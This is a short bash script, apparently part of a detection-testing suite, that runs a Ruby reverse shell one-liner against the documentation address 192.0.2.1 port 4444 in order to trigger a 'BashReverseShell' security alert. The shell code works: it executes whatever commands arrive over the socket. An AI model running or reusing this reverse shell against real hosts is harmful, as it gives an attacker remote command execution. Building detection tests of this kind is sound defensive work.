#!/bin/bash
# 06 - Reverse Shell (Ruby)
# Trigger: BashReverseShell IOA
# Tactic: C2 / Remote Access Tools
set -e
echo "=== [06] Reverse Shell (Ruby) ==="

ruby -rsocket -e '
begin
  f = TCPSocket.open("192.0.2.1", 4444)
  while(cmd = f.gets)
    IO.popen(cmd, "r") { |io| f.print io.read }
  end
rescue => e
  # Connection will fail (TEST-NET) but the attempt triggers the IOA
end
' 2>/dev/null || true

echo "[06] Done — BashReverseShell IOA should trigger"
